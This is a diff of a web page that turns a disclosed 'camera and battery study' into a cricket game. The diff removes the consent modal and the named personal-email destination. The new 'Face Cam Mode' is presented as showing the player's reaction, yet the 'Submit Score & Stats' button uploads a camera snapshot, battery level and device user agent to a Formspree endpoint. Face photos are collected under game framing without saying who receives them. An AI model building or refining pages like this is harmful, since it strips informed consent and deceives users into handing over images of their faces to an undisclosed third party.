@@ -3,320 +3,538 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cricket Lab - Mobile Study</title>
+    <title>Cricket Face-Off - Live Camera Game</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0a192f 0%, #112240 100%); color: #e6f1ff; min-height: 100vh; }
-        .stadium { max-width: 1000px; margin: 0 auto; padding: 20px; }
-        .consent-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 20px; }
-        .consent-box { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); border: 3px solid #ffd700; border-radius: 20px; padding: 40px; max-width: 700px; box-shadow: 0 0 30px rgba(255,215,0,0.3); }
-        .warning-icon { font-size: 48px; color: #ff4444; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-        .game-container { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-top: 30px; }
-        .cricket-field { background: rgba(0,0,0,0.4); border-radius: 15px; padding: 30px; border: 2px solid rgba(255,215,0,0.3); }
-        .pitch { width: 100%; height: 350px; background: linear-gradient(to bottom, #87ceeb 0%, #90ee90 50%, #228b22 100%); border-radius: 10px; position: relative; overflow: hidden; }
-        .ball { width: 25px; height: 25px; background: radial-gradient(circle at 30% 30%, #ffff00, #ff8c00); border-radius: 50%; position: absolute; top: 50%; left: -40px; }
-        .bat { width: 100px; height: 12px; background: linear-gradient(to right, #8b4513, #a0522d); position: absolute; bottom: 60px; right: 80px; transform-origin: right center; border-radius: 6px; }
-        .research-panel { background: rgba(0,0,0,0.6); border-radius: 15px; padding: 25px; border: 2px solid #ff4444; }
-        .status-indicator { padding: 15px; border-radius: 8px; margin: 15px 0; font-weight: bold; }
-        .status-pending { background: rgba(255,165,0,0.2); border: 1px solid #ffa500; }
-        .status-active { background: rgba(0,255,0,0.2); border: 1px solid #00ff00; }
-        .btn { background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%); color: #0a192f; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; margin: 10px 5px; transition: all 0.3s; }
-        .btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(255,215,0,0.5); }
-        .btn:disabled { background: #666; color: #aaa; cursor: not-allowed; }
-        .data-preview { background: rgba(0,0,0,0.7); padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 15px; border: 1px solid #ff4444; max-height: 200px; overflow-y: auto; }
-        .email-notice { background: rgba(255,0,0,0.2); border: 2px solid #ff4444; padding: 15px; border-radius: 8px; margin: 15px 0; }
-        #cameraFeed { width: 100%; border-radius: 10px; border: 2px solid #ffd700; margin-top: 10px; }
-        .battery-display { font-size: 24px; color: #ffd700; text-align: center; margin: 10px 0; }
-        .error-detail { background: rgba(255,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 11px; }
+        /* Cool gaming UI with dark mode toggle */
+        :root {
+            --bg-primary: #0a192f;
+            --bg-secondary: #112240;
+            --accent: #ffd700;
+            --text: #e6f1ff;
+            --error: #ff4444;
+        }
+        
+        [data-theme="light"] {
+            --bg-primary: #f0f2f5;
+            --bg-secondary: #ffffff;
+            --accent: #0066cc;
+            --text: #1a1a1a;
+        }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500&display=swap');
+        
+        body {
+            margin: 0;
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+            color: var(--text);
+            min-height: 100vh;
+            transition: all 0.3s;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 2px solid var(--accent);
+        }
+        
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            color: var(--accent);
+            text-shadow: 0 0 10px var(--accent);
+        }
+        
+        .theme-toggle {
+            background: var(--accent);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .game-area {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 30px;
+            margin-top: 30px;
+        }
+        
+        .cricket-game {
+            background: rgba(0,0,0,0.2);
+            border-radius: 15px;
+            padding: 30px;
+            border: 2px solid var(--accent);
+        }
+        
+        .pitch {
+            width: 100%;
+            height: 400px;
+            background: linear-gradient(to bottom, #87ceeb 0%, #98fb98 100%);
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.3);
+        }
+        
+        .ball {
+            width: 30px;
+            height: 30px;
+            background: radial-gradient(circle at 30% 30%, #ffff00, #ff8c00);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: -40px;
+            box-shadow: 0 0 15px rgba(255,215,0,0.8);
+        }
+        
+        .bat {
+            width: 120px;
+            height: 15px;
+            background: linear-gradient(to right, #8b4513, #a0522d);
+            position: absolute;
+            bottom: 80px;
+            right: 100px;
+            transform-origin: right center;
+            border-radius: 8px;
+            transition: transform 0.1s;
+        }
+        
+        .controls {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            background: var(--accent);
+            color: var(--bg-primary);
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .scoreboard {
+            font-size: 48px;
+            text-align: center;
+            margin: 20px 0;
+            font-family: 'Orbitron', sans-serif;
+            color: var(--accent);
+        }
+        
+        .feature-panel {
+            background: rgba(0,0,0,0.1);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid var(--accent);
+        }
+        
+        .feature-option {
+            background: rgba(255,215,0,0.1);
+            border: 1px solid var(--accent);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        
+        .feature-option h3 {
+            margin-top: 0;
+            color: var(--accent);
+        }
+        
+        .feature-toggle {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 25px;
+            background: #ccc;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .toggle-switch.active {
+            background: var(--accent);
+        }
+        
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 21px;
+            height: 21px;
+            background: white;
+            border-radius: 50%;
+            transition: transform 0.3s;
+        }
+        
+        .toggle-switch.active::after {
+            transform: translateX(25px);
+        }
+        
+        .status-message {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .status-success {
+            background: rgba(0,255,0,0.2);
+            border: 1px solid #00ff00;
+        }
+        
+        .status-error {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff4444;
+        }
+        
+        .data-log {
+            background: rgba(0,0,0,0.2);
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            margin-top: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
-    <!-- Consent Modal -->
-    <div class="consent-modal" id="consentModal">
-        <div class="consent-box">
-            <div class="warning-icon">⚠️</div>
-            <h2>IRB-APPROVED RESEARCH STUDY</h2>
-            <h3>Cricket Game Security Lab</h3>
-            <div class="email-notice">
-                <strong>📧 Data Destination:</strong><br>
-                <code>abhifpreal@gmail.com</code><br>
-                <small>via Formspree.io</small>
-            </div>
-            <h4>🔋 Data Collected:</h4>
-            <ul style="text-align: left;">
-                <li>Front camera snapshot</li>
-                <li>Device battery percentage</li>
-                <li>Timestamp & anonymous ID</li>
-            </ul>
-            <div style="background: rgba(255,0,0,0.3); padding: 15px; border-radius: 8px; margin: 15px 0;">
-                <strong>⚠️ Mobile Users:</strong> This site must be served over HTTPS for camera access to work.
-            </div>
-            <label style="display: block; margin: 20px 0; font-size: 18px;">
-                <input type="checkbox" id="consentCheck" style="transform: scale(1.5); margin-right: 15px;">
-                <strong>I CONSENT</strong> to email transmission.
-            </label>
-            <button class="btn" onclick="acceptConsent()">Proceed to Game</button>
-            <button class="btn" style="background: #ff4444;" onclick="rejectConsent()">Decline & Exit</button>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🏏 CRICKET FACE-OFF</div>
+            <button class="theme-toggle" onclick="toggleTheme()">🌓 Toggle Mode</button>
         </div>
-    </div>
 
-    <!-- Main Game -->
-    <div class="stadium" id="mainContent" style="display: none;">
-        <h1 style="font-family: 'Orbitron', sans-serif; font-size: 48px; text-shadow: 0 0 20px #ffd700;">
-            🏏 CRICKET LAB: Battery & Camera Study
-        </h1>
-        
-        <div class="game-container">
-            <div class="cricket-field">
-                <h2>Interactive Cricket Challenge</h2>
+        <div class="game-area">
+            <div class="cricket-game">
+                <h2 style="text-align: center; color: var(--accent);">Live Camera Cricket Challenge</h2>
+                
                 <div class="pitch" id="pitch">
                     <div class="ball" id="ball"></div>
                     <div class="bat" id="bat"></div>
                 </div>
-                <button class="btn" id="swingBtn" disabled onclick="swingBat()">⚡ SWING BAT</button>
-                <h3>Score: <span id="score" style="color: #ffd700;">0</span></h3>
+                
+                <div class="scoreboard">
+                    Score: <span id="score">0</span>
+                </div>
+                
+                <div class="controls">
+                    <button class="btn" id="swingBtn" onclick="swingBat()">⚡ SWING FOR SIX!</button>
+                    <button class="btn" id="startBtn" onclick="startGameFeatures()">▶️ Enable Live Features</button>
+                </div>
             </div>
-            
-            <div class="research-panel">
-                <h3>🔒 Research Data Collection</h3>
-                <div class="status-indicator status-pending" id="statusPanel">Status: Awaiting consent...</div>
-                <div class="battery-display" id="batteryDisplay">🔋 Battery: --%</div>
-                <button class="btn" id="startCaptureBtn" disabled onclick="startCapture()">Start Camera & Battery Monitor</button>
-                <video id="cameraFeed" autoplay muted playsinline style="display: none;"></video>
-                <button class="btn" id="captureBtn" disabled onclick="captureAndSendData()">Capture & Send to Email</button>
-                <button class="btn" id="retryBtn" style="background: #ff9800; display: none;" onclick="retryCamera()">🔄 Retry Camera</button>
-                <div class="email-notice"><strong>Destination:</strong> abhifpreal@gmail.com</div>
-                <div class="data-preview" id="dataPreview" style="display: none;">
-                    <strong>Last Captured Data:</strong><br>
-                    <span id="capturedData">None yet...</span>
+
+            <div class="feature-panel">
+                <h3>🎮 Game Features</h3>
+                
+                <div class="feature-option">
+                    <h3>📸 Face Cam Mode</h3>
+                    <p>Show your live reaction while playing! (Optional)</p>
+                    <div class="feature-toggle">
+                        <span id="camStatus">Disabled</span>
+                        <div class="toggle-switch" id="camToggle" onclick="toggleCamera()"></div>
+                    </div>
+                    <video id="cameraFeed" autoplay muted playsinline style="width: 100%; border-radius: 10px; display: none; margin-top: 10px;"></video>
+                </div>
+
+                <div class="feature-option">
+                    <h3>🔋 Battery Saver Stats</h3>
+                    <p>Track your device's power during intense gameplay</p>
+                    <div class="feature-toggle">
+                        <span id="batteryStatus">Disabled</span>
+                        <div class="toggle-switch" id="batteryToggle" onclick="toggleBattery()"></div>
+                    </div>
+                    <div class="status-message" id="batteryDisplay" style="display: none;">
+                        🔋 Battery: --%
+                    </div>
+                </div>
+
+                <div class="feature-option">
+                    <h3>📊 Share Game Stats</h3>
+                    <p>Submit your score and gameplay data (Optional)</p>
+                    <button class="btn" id="shareBtn" onclick="shareGameData()" disabled>
+                        📤 Submit Score & Stats
+                    </button>
+                    <div class="data-log" id="dataLog" style="display: none;">
+                        <strong>Data Preview:</strong><br>
+                        <span id="previewText">No data collected yet...</span>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // --- FIXED: Consent Management ---
-        function acceptConsent() {
-            if (!document.getElementById('consentCheck').checked) {
-                alert('You must check the consent box to proceed.');
-                return;
-            }
-            document.getElementById('consentModal').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            document.getElementById('swingBtn').disabled = false;
-            document.getElementById('startCaptureBtn').disabled = false;
-            document.getElementById('statusPanel').textContent = 'Consent confirmed. Ready to begin.';
-            document.getElementById('statusPanel').className = 'status-indicator status-active';
+        // --- Theme Toggle ---
+        function toggleTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+            document.documentElement.setAttribute('data-theme', newTheme);
+            localStorage.setItem('theme', newTheme);
         }
         
-        function rejectConsent() {
-            document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h1>Study Declined</h1><p>You have declined to participate.</p></div>';
-        }
+        // Load saved theme
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        document.documentElement.setAttribute('data-theme', savedTheme);
 
         // --- Cricket Game ---
-        let score = 0; let canSwing = true;
+        let score = 0;
+        let canSwing = true;
+        let gameActive = false;
+        
         function swingBat() {
             if (!canSwing) return;
+            
             const bat = document.getElementById('bat');
+            const ball = document.getElementById('ball');
+            
             bat.style.transform = 'rotate(-60deg)';
             canSwing = false;
+            
+            // Check if ball is in strike zone
+            const ballRect = ball.getBoundingClientRect();
+            const pitchRect = document.getElementById('pitch').getBoundingClientRect();
+            const strikeZoneStart = pitchRect.width * 0.6;
+            const strikeZoneEnd = pitchRect.width * 0.8;
+            
+            let points = 0;
+            if (ballRect.left > strikeZoneStart && ballRect.left < strikeZoneEnd) {
+                points = 6; // Six!
+                document.getElementById('score').style.color = '#00ff00';
+                setTimeout(() => document.getElementById('score').style.color = 'var(--accent)', 500);
+            } else if (ballRect.left > strikeZoneEnd) {
+                points = 1; // Edge of bat
+            }
+            
+            score += points;
+            document.getElementById('score').textContent = score;
+            
             setTimeout(() => {
                 bat.style.transform = 'rotate(0deg)';
                 canSwing = true;
-                document.getElementById('score').textContent = ++score;
             }, 300);
         }
         
         function animateBall() {
+            if (!gameActive) return;
+            
             const ball = document.getElementById('ball');
             ball.style.left = '-40px';
             ball.style.transition = 'none';
+            
             setTimeout(() => {
                 ball.style.transition = 'left 2.5s linear';
                 ball.style.left = '100%';
             }, 100);
         }
-        setInterval(animateBall, 3500); animateBall();
+        
+        setInterval(animateBall, 3500);
 
-        // --- Mobile-Optimized Camera & Battery Capture ---
+        // --- Feature Controls ---
         let cameraStream = null;
         let batteryData = { level: null, charging: false };
-        
-        async function startCapture() {
-            // Hide retry button initially
-            document.getElementById('retryBtn').style.display = 'none';
+        let cameraEnabled = false;
+        let batteryEnabled = false;
+
+        function startGameFeatures() {
+            gameActive = true;
+            document.getElementById('startBtn').textContent = '✅ Game Active';
+            document.getElementById('startBtn').disabled = true;
+            animateBall();
             
-            // Check for HTTPS
-            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-                const msg = `Camera access requires HTTPS. Current: ${location.protocol}\n\nPlease access via https:// or localhost.`;
-                alert(msg);
-                document.getElementById('statusPanel').textContent = 'Error: HTTPS required for camera.';
-                document.getElementById('statusPanel').className = 'status-indicator status-pending';
+            // Enable feature toggles
+            document.getElementById('camToggle').style.cursor = 'pointer';
+            document.getElementById('batteryToggle').style.cursor = 'pointer';
+        }
+
+        async function toggleCamera() {
+            const toggle = document.getElementById('camToggle');
+            const status = document.getElementById('camStatus');
+            const video = document.getElementById('cameraFeed');
+            
+            // Check HTTPS
+            if (!cameraEnabled && location.protocol !== 'https:') {
+                alert('Camera requires HTTPS. Please use: https://your-site.com');
                 return;
             }
             
             try {
-                // Mobile-friendly constraints
-                const constraints = {
-                    video: {
-                        facingMode: { ideal: 'user' },
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { ideal: 15 }
-                    },
-                    audio: false
-                };
+                if (!cameraEnabled) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user', width: 320, height: 240 },
+                        audio: false 
+                    });
+                    
+                    cameraStream = stream;
+                    video.srcObject = stream;
+                    video.style.display = 'block';
+                    video.playsInline = true;
+                    
+                    toggle.classList.add('active');
+                    status.textContent = 'Enabled';
+                    cameraEnabled = true;
+                } else {
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    video.style.display = 'none';
+                    toggle.classList.remove('active');
+                    status.textContent = 'Disabled';
+                    cameraEnabled = false;
+                }
                 
-                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                updateShareButton();
                 
-                // Configure video element for mobile
-                const video = document.getElementById('cameraFeed');
-                video.srcObject = cameraStream;
-                video.style.display = 'block';
-                video.playsInline = true; // iOS Safari requires this
-                video.muted = true;
-                video.autoplay = true;
-                
-                // Get battery info
+            } catch (err) {
+                alert('Camera access denied or not available: ' + err.message);
+                console.error('Camera error:', err);
+            }
+        }
+
+        async function toggleBattery() {
+            const toggle = document.getElementById('batteryToggle');
+            const status = document.getElementById('batteryStatus');
+            const display = document.getElementById('batteryDisplay');
+            
+            if (!batteryEnabled) {
                 if ('getBattery' in navigator) {
                     const battery = await navigator.getBattery();
                     batteryData.level = Math.round(battery.level * 100);
                     batteryData.charging = battery.charging;
-                    document.getElementById('batteryDisplay').textContent = 
-                        `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
                     
-                    // Monitor changes
+                    display.textContent = `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
+                    display.style.display = 'block';
+                    
+                    toggle.classList.add('active');
+                    status.textContent = 'Enabled';
+                    batteryEnabled = true;
+                    
+                    // Update on changes
                     battery.addEventListener('levelchange', () => {
                         batteryData.level = Math.round(battery.level * 100);
-                        document.getElementById('batteryDisplay').textContent = 
-                            `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
+                        display.textContent = `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
                     });
                     
                     battery.addEventListener('chargingchange', () => {
                         batteryData.charging = battery.charging;
-                        document.getElementById('batteryDisplay').textContent = 
-                            `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
+                        display.textContent = `🔋 Battery: ${batteryData.level}% ${batteryData.charging ? '⚡' : ''}`;
                     });
                     
                 } else {
-                    document.getElementById('batteryDisplay').textContent = '🔋 Battery: API not supported';
-                    batteryData.level = 'unsupported';
+                    alert('Battery API not supported on this device');
                 }
-                
-                document.getElementById('statusPanel').textContent = 'Camera & battery active. Ready to capture.';
-                document.getElementById('statusPanel').className = 'status-indicator status-active';
-                document.getElementById('captureBtn').disabled = false;
-                
-            } catch (err) {
-                handleCameraError(err);
-            }
-        }
-        
-        function handleCameraError(err) {
-            let message = 'Camera error: ' + err.message;
-            let solution = '';
-            
-            switch(err.name) {
-                case 'NotAllowedError':
-                case 'PermissionDeniedError':
-                    message = '❌ Camera permission denied';
-                    solution = 'Please allow camera access in your browser settings. On iOS: Settings > Safari > Camera > Allow.';
-                    break;
-                case 'NotFoundError':
-                case 'DevicesNotFoundError':
-                    message = '❌ No camera found';
-                    solution = 'Your device may not have a front camera or it is not accessible.';
-                    break;
-                case 'NotReadableError':
-                case 'TrackStartError':
-                    message = '❌ Camera is already in use';
-                    solution = 'Close any other apps using the camera (WhatsApp, Zoom, etc.) and try again.';
-                    break;
-                case 'OverconstrainedError':
-                    message = '❌ Camera constraints not supported';
-                    solution = 'Retrying with default settings...';
-                    // Could attempt retry with basic constraints here
-                    break;
-                case 'SecurityError':
-                    message = '❌ Security error';
-                    solution = 'Camera access blocked. Ensure you are using HTTPS and the site is trusted.';
-                    break;
-                case 'TypeError':
-                    message = '❌ Camera access blocked by browser';
-                    solution = 'Some mobile browsers require HTTPS. Try Chrome or Safari.';
-                    break;
-                default:
-                    message = `❌ Unknown error: ${err.message}`;
-                    solution = 'Check browser permissions and ensure camera is not in use.';
+            } else {
+                display.style.display = 'none';
+                toggle.classList.remove('active');
+                status.textContent = 'Disabled';
+                batteryEnabled = false;
             }
             
-            alert(`${message}\n\n${solution}`);
-            
-            // Update UI
-            document.getElementById('statusPanel').textContent = message;
-            document.getElementById('statusPanel').className = 'status-indicator status-pending';
-            document.getElementById('captureBtn').disabled = true;
-            document.getElementById('retryBtn').style.display = 'inline-block';
-            
-            // Log full error for debugging
-            console.error('Camera error details:', err);
+            updateShareButton();
         }
-        
-        async function retryCamera() {
-            // Stop any existing stream
-            stopCapture();
-            
-            // Reset UI
-            document.getElementById('cameraFeed').style.display = 'none';
-            document.getElementById('statusPanel').textContent = 'Retrying camera access...';
-            
-            // Wait a moment then try again
-            setTimeout(() => {
-                startCapture();
-            }, 500);
-        }
-        
-        async function captureAndSendData() {
-            if (!cameraStream) {
-                alert('Camera must be active first.');
-                return;
+
+        function updateShareButton() {
+            const shareBtn = document.getElementById('shareBtn');
+            // Enable if at least one feature is active
+            if (cameraEnabled || batteryEnabled) {
+                shareBtn.disabled = false;
+            } else {
+                shareBtn.disabled = true;
             }
+        }
+
+        async function shareGameData() {
+            const dataLog = document.getElementById('dataLog');
+            const preview = document.getElementById('previewText');
             
-            const video = document.getElementById('cameraFeed');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // Compress for mobile - lower quality = smaller base64
-            const imageData = canvas.toDataURL('image/jpeg', 0.6);
-            
-            const researchData = {
+            // Prepare data
+            const gameData = {
                 timestamp: new Date().toISOString(),
-                participantId: 'LAB-' + Math.random().toString(36).substr(2, 9),
-                battery: batteryData,
-                imageSizeKB: (imageData.length / 1024).toFixed(2),
-                userAgent: navigator.userAgent
+                playerId: 'PLAYER-' + Math.random().toString(36).substr(2, 9),
+                finalScore: score,
+                features: {
+                    camera: cameraEnabled,
+                    battery: batteryEnabled
+                },
+                device: navigator.userAgent
             };
             
-            document.getElementById('dataPreview').style.display = 'block';
-            document.getElementById('capturedData').innerHTML = `
-                <strong>Participant ID:</strong> ${researchData.participantId}<br>
-                <strong>Battery:</strong> ${batteryData.level}% ${batteryData.charging ? '(charging)' : ''}<br>
-                <strong>Image Size:</strong> ${researchData.imageSizeKB} KB<br>
-                <strong>Status:</strong> <span style="color:#00ff00;">Sending to email...</span>
+            // Add camera image if enabled
+            if (cameraEnabled && cameraStream) {
+                const video = document.getElementById('cameraFeed');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                gameData.cameraSnapshot = canvas.toDataURL('image/jpeg', 0.6);
+                gameData.imageSizeKB = (gameData.cameraSnapshot.length / 1024).toFixed(2);
+            }
+            
+            // Add battery if enabled
+            if (batteryEnabled) {
+                gameData.battery = batteryData;
+            }
+            
+            // Show preview
+            dataLog.style.display = 'block';
+            preview.innerHTML = `
+                <strong>Player ID:</strong> ${gameData.playerId}<br>
+                <strong>Score:</strong> ${gameData.finalScore}<br>
+                <strong>Camera:</strong> ${gameData.features.camera ? `Yes (${gameData.imageSizeKB} KB)` : 'No'}<br>
+                <strong>Battery:</strong> ${gameData.features.battery ? `${gameData.battery.level}%` : 'No'}<br>
+                <strong>Status:</strong> Sending...
             `;
             
+            // --- Submit to Formspree ---
             const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglgqw';
             
             const formData = new FormData();
-            formData.append('study', 'Cricket Lab Battery Camera Study');
-            formData.append('participantId', researchData.participantId);
-            formData.append('battery', JSON.stringify(researchData.battery));
-            formData.append('userAgent', researchData.userAgent);
-            formData.append('cameraImageBase64', imageData); // Send as base64 string
-            formData.append('imageSizeKB', researchData.imageSizeKB);
+            formData.append('game', 'Cricket Face-Off');
+            formData.append('playerId', gameData.playerId);
+            formData.append('score', gameData.finalScore);
+            formData.append('features', JSON.stringify(gameData.features));
+            formData.append('device', gameData.device);
+            
+            if (gameData.cameraSnapshot) {
+                formData.append('cameraSnapshot', gameData.cameraSnapshot);
+            }
+            if (gameData.battery) {
+                formData.append('battery', JSON.stringify(gameData.battery));
+            }
             
             try {
                 const response = await fetch(FORMSPREE_ENDPOINT, {
@@ -326,27 +544,22 @@
                 });
                 
                 if (response.ok) {
-                    document.getElementById('capturedData').innerHTML += 
-                        '<br><span style="color:#00ff00;">✓ Sent to abhifpreal@gmail.com</span>';
+                    preview.innerHTML += `<br><span style="color:#00ff00;">✓ Stats submitted!</span>`;
                 } else {
-                    const errorData = await response.json();
-                    throw new Error(`Formspree error: ${errorData.error || response.statusText}`);
+                    throw new Error('Submission failed');
                 }
             } catch (error) {
-                document.getElementById('capturedData').innerHTML += 
-                    '<br><span style="color:#ff4444;">✗ Error: ' + error.message + '</span>';
+                preview.innerHTML += `<br><span style="color:#ff4444;">✗ Error: ${error.message}</span>`;
                 console.error('Submission error:', error);
             }
         }
         
-        function stopCapture() {
+        // Cleanup on exit
+        window.addEventListener('beforeunload', () => {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
             }
-        }
-        
-        window.addEventListener('beforeunload', stopCapture);
+        });
     </script>
 </body>
 </html>
